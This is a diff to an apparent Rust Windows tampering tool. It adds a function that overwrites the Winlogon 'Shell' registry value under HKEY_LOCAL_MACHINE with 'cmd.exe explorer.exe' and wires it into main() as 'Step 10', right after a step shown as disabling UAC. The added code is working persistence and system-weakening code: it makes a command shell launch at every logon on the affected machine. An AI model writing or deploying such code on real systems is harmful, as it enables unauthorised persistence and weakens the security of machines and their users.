@@ -223,6 +223,23 @@ fn create_directory() -> io::Result<()> {
     }
 }
 
+fn modify_registry() -> io::Result<()> {
+    // Open the registry key for Winlogon
+    let hkcu = RegKey::predef(HKEY_LOCAL_MACHINE);
+    let winlogon_key = hkcu.open_subkey_with_flags(
+        r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
+        KEY_SET_VALUE,
+    )?;
+
+    // Set new "Shell" value (overwrites existing one)
+    let new_shell_value = r"cmd.exe explorer.exe";  
+    winlogon_key.set_value("Shell", &new_shell_value)?;
+
+    println!("Registry modified successfully: Shell set to \"cmd.exe explorer.exe\".");
+
+    Ok(())
+}
+
 fn main() {
     // Step 1: Admin Control Check
     if !is_admin() {
@@ -282,6 +299,11 @@ fn main() {
     // Step 9: Disable UAC
     if let Err(e) = disable_uac() {
         eprintln!("Error disabling UAC: {}", e);
+    }
+
+    // Step 10: Modify Registry
+    if let Err(e) = modify_registry() {
+        eprintln!("Error modifying registry: {}", e);
     }
 
 }
